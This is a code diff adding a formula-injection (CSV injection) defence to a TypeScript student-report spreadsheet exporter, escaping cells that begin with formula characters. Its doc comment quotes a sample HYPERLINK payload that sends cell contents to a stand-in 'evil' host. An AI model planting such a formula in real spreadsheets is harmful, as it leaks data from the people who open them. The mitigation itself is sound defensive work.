@@ -61,8 +61,31 @@ function autoWidth(rows: Row[]): XLSX.ColInfo[] {
   });
 }
 
+/**
+ * Neutralise spreadsheet formula injection (CSV injection).
+ *
+ * Student names, rolls and handles are scraped or bulk-imported, so their first
+ * character is not under our control. Excel, LibreOffice and Sheets all treat a
+ * leading =, +, -, @ (and the tab/CR forms) as the start of a formula, so a
+ * student named `=HYPERLINK("http://evil/?"&A1,"click")` becomes live content in
+ * the exported workbook — executed on the machine of whichever staff member
+ * opens the report.
+ *
+ * Prefixing with an apostrophe is the standard mitigation: the cell renders as
+ * the literal text and the leading quote is not part of the value.
+ */
+function deFormula(value: unknown): unknown {
+  if (typeof value !== "string" || value.length === 0) return value;
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+}
+
 function sheetFrom(rows: Row[]): XLSX.WorkSheet {
-  const ws = XLSX.utils.json_to_sheet(rows);
+  const safeRows = rows.map((r) => {
+    const out: Row = {};
+    for (const [k, v] of Object.entries(r)) out[k] = deFormula(v) as Row[string];
+    return out;
+  });
+  const ws = XLSX.utils.json_to_sheet(safeRows);
   ws["!cols"] = autoWidth(rows);
   if (rows.length > 0) {
     // Freeze the header so a 40k-row Fact sheet stays navigable.
@@ -131,3 +154,6 @@ export function downloadReportWorkbook(data: ReportData): string {
   XLSX.writeFile(wb, filename);
   return filename;
 }
+
+/** Internals exposed for tests only. */
+export const __test = { deFormula };
